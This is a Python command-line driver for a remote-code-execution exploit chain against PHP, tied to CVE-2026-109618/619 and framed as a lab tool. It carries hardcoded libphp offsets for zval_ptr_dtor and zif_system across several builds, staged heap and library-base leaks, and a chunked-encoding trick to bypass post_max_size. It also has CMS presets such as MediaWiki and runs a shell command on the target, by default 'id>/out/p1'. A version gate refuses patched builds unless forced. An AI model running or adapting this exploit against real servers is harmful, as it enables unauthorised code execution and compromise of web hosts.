"""p2s clean-room CLI (docs/76 R2).

Usage:
  python -m p2s.cli -u http://127.0.0.1:19016/index.php --check
  python -m p2s.cli -u http://127.0.0.1:19016/index.php --stage1
  python -m p2s.cli -u http://127.0.0.1:19016/index.php --run \
      --container cbo8426 --container-proof /out/p1 --fetch-match uid=
"""
from __future__ import annotations

import argparse
import json
import sys

from . import cms, geometry, proof, pure128, transport, warning, workers

# Symbol offsets for the builds we have measured.  These are *build* constants
# (AGENTS iron rule #4): the caller can override them, and a CMS preset can pin
# the build it was measured on (docs/47 §2.3, docs/52 N1: the MediaWiki 8.3.35
# libphp has a different sha256 than the official image but the offsets hold).
_BUILD_OFFSETS: dict[str, tuple[int, int]] = {
    "8.3.35": (0x49EC50, 0x3AC080),      # profiles.py 8.3.35
    "8.4.26": (0x65EB60, 0x465370),      # profiles.py 8.4.26
    "8.5.11": (0x7B47A0, 0x5996E0),      # profiles.py 8.5.11
}
DEFAULT_OFFSETS = _BUILD_OFFSETS["8.4.26"]


def _resolve_offsets(args, preset, version: str | None = None) -> tuple[int, int]:
    """dtor/zif offsets: explicit flag > CMS preset > build table."""
    dtor, zif = _BUILD_OFFSETS.get(version or "", DEFAULT_OFFSETS)
    if preset is not None:
        dtor = preset.dtor_offset or dtor
        zif = preset.zif_offset or zif
    if args.dtor_offset is not None:
        dtor = args.dtor_offset
    if args.zif_offset is not None:
        zif = args.zif_offset
    return dtor, zif


def _huge_mb(args, preset) -> int:
    """Size of the OOM field: explicit > preset > memory_limit + 4."""
    if args.huge_mb is not None:
        return args.huge_mb
    if preset is not None and preset.huge_mb:
        return preset.huge_mb
    return int(args.limits or 8) + 4


def _warning_config(args, huge_mb: int) -> warning.WarningConfig:
    """Warning shape, every value overridable from the command line."""
    return warning.WarningConfig(
        session_name=args.session_name, huge_mb=huge_mb,
        stage1_fields=args.stage1_fields, stage1_n=args.stage1_n,
        stage2_fields=args.stage2_fields, stage2_groups=args.stage2_groups,
        stage2_t=args.stage2_t, stage2_v=args.stage2_v,
        retries=args.retries, timeout=args.timeout, chunked=args.chunked)


def _refuse_patched(info: dict, force: bool) -> int | None:
    """Version gate mirroring exploit.py (docs/98 C1): patched builds exit 3.

    p2s is a lab tool, but it must not send attack traffic to a build that is at
    or above the fixed release for CVE-2026-109618/619.  ``--force`` is only for
    negative-control labs (e.g. cbo8427 / 8.4.27).
    """
    if force or not info.get("patched"):
        return None
    print("[!] PHP %s is at or above the fixed release for CVE-2026-109618/619.\n"
          "    Nothing to exploit here. Re-run with --force only for "
          "negative-control labs." % info.get("version"), file=sys.stderr)
    return 3


def _run_pure(ep: transport.Endpoint, args) -> int:
    info = warning.probe(ep)
    gate = _refuse_patched(info, getattr(args, "force", False))
    if gate is not None:
        return gate
    version = info.get("version")
    if not version:
        print("[!] cannot determine the PHP version from X-Powered-By",
              file=sys.stderr)
        return 1
    try:
        geo = pure128.geometry(version)
    except pure128.PureError as exc:
        print("[!] %s" % exc, file=sys.stderr)
        return 1
    if len(args.cmd.encode()) > pure128.MAX_CMD:
        print("[!] pure128 allows at most %d command bytes (got %d)"
              % (pure128.MAX_CMD, len(args.cmd.encode())), file=sys.stderr)
        return 1
    cfg = pure128.PureConfig(cmd=args.cmd.encode(), timeout=args.timeout,
                             retries=max(2, args.retries))
    print("[*] PHP %s / pure128: dtor=0x%x zif=0x%x S=+0x%x delta=0x%x-0x%x"
          % (version, geo.dtor_offset, geo.zif_offset, geo.s_offset,
             geo.delta_min, geo.delta_max))

    spec = proof.ProofSpec(local_path=args.proof_file,
                           fetch_path=args.fetch,
                           container=args.container,
                           container_path=args.container_proof,
                           match=args.fetch_match.encode())
    spec.clear()
    pinner = None
    try:
        if args.workers > 1:
            pinner = workers.WorkerPinner(ep, args.workers - 1).start()
            print("[*] pinning %d worker(s) of %d"
                  % (args.workers - 1, args.workers), flush=True)
        result = pure128.run(
            ep, cfg, geo, check_proof=lambda: spec.check(ep),
            log=lambda m: print(m, flush=True))
    except pure128.PureError as exc:
        print("[!] %s" % exc, file=sys.stderr)
        return 1
    except Exception as exc:
        print("[!] pure128 failed: %s" % exc, file=sys.stderr)
        return 1
    finally:
        if pinner is not None:
            pinner.stop()

    print("lib=0x%x zdtor=0x%x main=0x%x S=0x%x zif=0x%x decoded=%d attempts=%d"
          % (result.lib, result.zdtor, result.main, result.s, result.zif,
             result.decoded, result.attempts))
    if result.passed:
        print("PROOF: %s" % result.proof)
        return 0
    print("[!] no proof from %s"
          % (args.container_proof or args.fetch or args.proof_file
             or "any source"), file=sys.stderr)
    return 1


def _run(ep: transport.Endpoint, args, preset, huge_mb: int) -> int:
    info = warning.probe(ep)
    gate = _refuse_patched(info, getattr(args, "force", False))
    if gate is not None:
        return gate
    version = info.get("version")
    if not version:
        print("[!] cannot determine the PHP version from X-Powered-By; "
              "stage-3 geometry is build-specific", file=sys.stderr)
        return 1
    try:
        geo = geometry.select(version, args.limits or 8)
    except geometry.GeometryError as exc:
        if not args.explicit_geometry:
            print("[!] %s" % exc, file=sys.stderr)
            print("[!] for an uncalibrated CMS shape pass --explicit-geometry "
                  "with --a-extra/--stage3-fpads/--htdata-offset/--carrier-len/"
                  "--fill-len (docs/89 §5)", file=sys.stderr)
            return 1
        geo = geometry.Stage3Geometry(
            int(args.limits or 8), args.a_extra,
            args.stage3_fpads if args.stage3_fpads is not None else 2,
            args.htdata_offset if args.htdata_offset is not None else 0x6A0D8,
            args.carrier_len, args.fill_len)
        print("[!] %s -> explicit geometry: a_extra=%d f_pads=%d htdata=0x%x"
              % (exc, geo.a_extra, geo.f_pads, geo.htdata_offset))
    cfg = _warning_config(args, huge_mb)
    cfg.stage3_f_pads = (geo.f_pads if args.stage3_fpads is None
                         else args.stage3_fpads)
    cfg.stage3_a_extra = geo.a_extra
    cfg.stage3_carrier_len = geo.carrier_len
    cfg.stage3_fill_len = geo.fill_len
    dtor_offset, zif_offset = _resolve_offsets(args, preset, version)
    htdata_offset = (geo.htdata_offset if args.htdata_offset is None
                     else args.htdata_offset)
    print("[*] PHP %s / %dM: a_extra=%d f_pads=%d htdata=0x%x carrier=%d "
          "fill=%d chunked=%s huge=%dM dtor=0x%x zif=0x%x"
          % (version, geo.limit_mb, geo.a_extra, cfg.stage3_f_pads,
             htdata_offset, geo.carrier_len, geo.fill_len, cfg.chunked,
             cfg.huge_mb, dtor_offset, zif_offset))

    spec = proof.ProofSpec(local_path=args.proof_file,
                           fetch_path=args.fetch,
                           container=args.container,
                           container_path=args.container_proof,
                           match=args.fetch_match.encode())
    spec.clear()
    pinner = None
    try:
        if args.workers > 1:
            # Leave exactly one free child for the chain (AGENTS §6 #6).
            pinner = workers.WorkerPinner(ep, args.workers - 1).start()
            print("[*] pinning %d worker(s) of %d"
                  % (args.workers - 1, args.workers), flush=True)
        result = warning.run(
            ep, cfg, dtor_offset=dtor_offset,
            htdata_offset=htdata_offset, zif_offset=zif_offset,
            cmd=args.cmd.encode(), attempts=args.attempts,
            check_proof=lambda: spec.check(ep),
            pre_rotate=not args.no_pre_rotate,
            log=lambda m: print(m, flush=True))
    except warning.ChainError as exc:
        print("[!] %s" % exc, file=sys.stderr)
        return 1
    except Exception as exc:                  # network/timeout, keep the CLI exit
        print("[!] run failed: %s" % exc, file=sys.stderr)
        return 1
    finally:
        if pinner is not None:
            pinner.stop()

    print("chunk=0x%x pie=0x%x htdata=0x%x zif=0x%x attempts=%d"
          % (result.chunk, result.pie, result.htdata, result.zif,
             result.attempts))
    if result.passed:
        print("PROOF: %s" % result.proof)
        return 0
    print("[!] no proof from %s"
          % (args.container_proof or args.fetch or args.proof_file
             or "any source"), file=sys.stderr)
    return 1


def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-u", "--url", default="")
    ap.add_argument("--check", action="store_true")
    ap.add_argument("--stage1", action="store_true")
    ap.add_argument("--stage2", action="store_true")
    ap.add_argument("--run", action="store_true")
    ap.add_argument("--pure128", action="store_true",
                    help="use the de=Off/128M chain (stock ini)")
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None,
                    help="libphp zval_ptr_dtor offset (default: build table / "
                         "CMS preset; 8.4.26 = 0x65EB60)")
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=None,
                    help="override the geometry record's fake HashTable offset")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None,
                    help="libphp zif_system offset (default: build table / "
                         "CMS preset; 8.4.26 = 0x465370)")
    ap.add_argument("--cmd", default="id>/out/p1")
    ap.add_argument("--session-name", default="PHPSESSID")
    ap.add_argument("--huge-mb", type=int, default=None,
                    help="size of the OOM field in MB (default: CMS preset, "
                         "else memory_limit + 4; must exceed memory_limit)")
    ap.add_argument("--chunked", action="store_true",
                    help="send OOM requests with Transfer-Encoding: chunked and "
                         "no Content-Length, which skips PHP's post_max_size "
                         "guard (needed when post_max_size < memory_limit, e.g. "
                         "MediaWiki 128M/8M; docs/47 §1, docs/48 §3.1)")
    ap.add_argument("--no-chunked", action="store_true",
                    help="do not inherit the CMS preset's chunked flag")
    ap.add_argument("--chain-path", default="",
                    help="request path used by the chain (overrides a CMS "
                         "preset's pinned path, e.g. mediawiki -> /_p2s_ip.php)")
    ap.add_argument("--stage1-fields", type=int, default=1001,
                    help="A-phase filler field count (shape knob)")
    ap.add_argument("--stage1-n", type=int, default=841,
                    help="B-phase value field count (shape knob)")
    ap.add_argument("--stage2-fields", type=int, default=1001)
    ap.add_argument("--stage2-groups", type=int, default=983)
    ap.add_argument("--stage2-t", type=int, default=406)
    ap.add_argument("--stage2-v", type=int, default=16)
    ap.add_argument("--limits", type=int, default=None,
                    help="target memory_limit in MB (selects stage-3 geometry)")
    ap.add_argument("--cms", default="",
                    help="CMS preset name (see --cms-list)")
    ap.add_argument("--cms-list", action="store_true",
                    help="print the CMS preset table and exit")
    ap.add_argument("--retries", type=int, default=3,
                    help="leak retries and endgame attempts on the first heap "
                         "candidate")
    ap.add_argument("--attempts", type=int, default=3,
                    help="endgame attempts on the first heap candidate")
    ap.add_argument("--stage3-fpads", type=int, default=None,
                    help="override the geometry record's filler count")
    ap.add_argument("--a-extra", type=int, default=0,
                    help="stage-3 A extra bin-32 fields (explicit geometry)")
    ap.add_argument("--carrier-len", type=int, default=15,
                    help="stage-3 carrier length (explicit geometry)")
    ap.add_argument("--fill-len", type=int, default=15,
                    help="stage-3 filler length (explicit geometry)")
    ap.add_argument("--explicit-geometry", action="store_true",
                    help="build the stage-3 geometry from the shape flags "
                         "instead of the calibrated build table (uncalibrated "
                         "CMS targets; the record must still be proven)")
    ap.add_argument("--no-pre-rotate", action="store_true")
    ap.add_argument("--force", action="store_true",
                    help="negative-control labs only: run even on a patched "
                         "build (exit 3 otherwise; mirrors exploit.py)")
    ap.add_argument("--workers", type=int, default=None,
                    help="Apache MaxRequestWorkers: pin N-1 children "
                         "(default: CMS preset, else 1)")
    ap.add_argument("--container", default="")
    ap.add_argument("--container-proof", default="")
    ap.add_argument("--proof-file", default="")
    ap.add_argument("--fetch", default="")
    ap.add_argument("--fetch-match", default="")
    ap.add_argument("--timeout", type=float, default=90.0)
    args = ap.parse_args()

    if args.cms_list:
        for row in cms.preset_table_rows():
            print("%-12s php=%-8s de=%-3s mem=%-5s post=%-5s strategy=%-8s"
                  " limits=%-10s %s"
                  % (row["cms"], row["php"], row["display_errors"],
                     row["memory_limit"], row["post_max_size"],
                     row["strategy"], row["limits"], row["expected"][:60]))
        return 0

    if not args.url:
        ap.error("-u/--url is required unless --cms-list is used")

    preset = None
    if args.cms:
        try:
            preset = cms.resolve(args.cms)
        except KeyError as exc:
            print("[!] %s" % exc, file=sys.stderr)
            return 1
        if args.limits is None:
            args.limits = preset.memory_limit_mb or 8
        if preset.strategy == "pure128":
            args.pure128 = True
        if preset.chunked and not args.no_chunked:
            args.chunked = True
        print("[*] CMS %s: %s" % (preset.name, preset.title))
        print("[*] strategy=%s limits=%s chunked=%s (preset=%s)"
              % (preset.strategy, args.limits, args.chunked, preset.chunked))
        if preset.notes:
            print("[*] note: %s" % preset.notes)

    if args.workers is None:
        args.workers = (preset.workers if preset and preset.workers else 1)

    ep = transport.Endpoint.parse(args.url)

    # A CMS preset may pin the request path: the app's own entry script is not
    # always usable for the chain (MediaWiki's installer dies before the session
    # flush, docs/89 §5.4).  --chain-path overrides, otherwise the URL wins when
    # the preset has no path.
    chain_path = args.chain_path or (preset.chain_path if preset else "")
    if chain_path and ep.base_path != chain_path:
        ep = transport.Endpoint(ep.scheme, ep.host, ep.port, chain_path)
        print("[*] chain path: %s (CMS preset; --chain-path overrides)"
              % chain_path)

    if not (args.check or args.stage1 or args.stage2 or args.run):
        ap.error("choose --check, --stage1, --stage2 and/or --run")

    info = None
    if args.check:
        info = warning.probe(ep)
        print(json.dumps(info, indent=2, ensure_ascii=False))
        gate = _refuse_patched(info, args.force)
        if gate is not None:
            return gate
        if not (args.stage1 or args.stage2 or args.run):
            return 0

    huge_mb = _huge_mb(args, preset)
    cfg = _warning_config(args, huge_mb)
    print("[*] shape: fields=%d n=%d huge=%dM chunked=%s retries=%d"
          % (cfg.stage1_fields, cfg.stage1_n, cfg.huge_mb, cfg.chunked,
             cfg.retries))
    if args.run:
        if args.pure128:
            return _run_pure(ep, args)
        return _run(ep, args, preset, huge_mb)
    # --stage1/--stage2 do not probe by themselves; enforce the version gate
    # before sending any attack traffic (docs/98 C1).  Reuse the --check probe
    # when both flags are given (avoid one extra GET before the chain).
    if info is None:
        info = warning.probe(ep)
    gate = _refuse_patched(info, args.force)
    if gate is not None:
        return gate
    dtor_offset, _zif_offset = _resolve_offsets(args, preset, info.get("version"))
    pinner = None
    if args.workers > 1:
        pinner = workers.WorkerPinner(ep, args.workers - 1).start()
        print("[*] pinning %d worker(s) of %d"
              % (args.workers - 1, args.workers), flush=True)
    if args.stage1:
        try:
            candidates = warning.stage1_candidates(ep, cfg)
        except Exception as exc:
            print("[!] stage1 failed: %s" % exc, file=sys.stderr)
            return 1
        print("chunk candidates: " + ", ".join("0x%x" % c for c in candidates))
    if args.stage2:
        try:
            base = warning.stage2_libphp(ep, cfg, dtor_offset)
        except Exception as exc:
            print("[!] stage2 failed: %s" % exc, file=sys.stderr)
            return 1
        print("libphp base: 0x%x" % base)
    if pinner is not None:
        pinner.stop()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
